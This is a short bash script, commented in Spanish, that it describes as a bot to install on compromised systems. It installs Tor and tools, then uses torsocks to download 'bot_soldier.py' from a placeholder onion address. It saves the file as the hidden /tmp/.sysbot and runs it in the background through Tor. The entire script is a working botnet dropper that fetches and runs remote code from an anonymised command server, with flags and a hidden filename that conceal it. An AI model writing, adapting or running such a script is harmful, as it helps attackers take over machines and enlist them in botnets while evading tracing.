#!/bin/bash
# Bot con soporte Tor - Instalar en sistemas comprometidos

echo "[*] Instalando Tor y dependencias..."

# Detectar sistema operativo
if [ -f /etc/debian_version ]; then
    # Debian/Ubuntu
    apt-get update -qq
    apt-get install -y -qq tor torsocks python3 python3-pip curl wget
elif [ -f /etc/redhat-release ]; then
    # CentOS/RHEL
    yum install -y -q tor python3 python3-pip curl wget
elif [ -f /etc/arch-release ]; then
    # Arch Linux
    pacman -Sy --noconfirm tor python python-pip curl wget
else
    echo "[!] Sistema no soportado"
    exit 1
fi

# Iniciar servicio Tor
systemctl start tor 2>/dev/null || service tor start 2>/dev/null &

# Descargar bot con Tor
echo "[*] Descargando bot..."
torsocks curl -s -o /tmp/.sysbot http://YOUR_ONION_ADDRESS.onion:8000/bot_soldier.py || \
torsocks wget -q -O /tmp/.sysbot http://YOUR_ONION_ADDRESS.onion:8000/bot_soldier.py

# Instalar dependencias Python
pip3 install --quiet paramiko cryptography 2>/dev/null

# Ejecutar bot a través de Tor
echo "[*] Iniciando bot..."
torsocks python3 /tmp/.sysbot &

echo "[+] Bot instalado y ejecutándose"
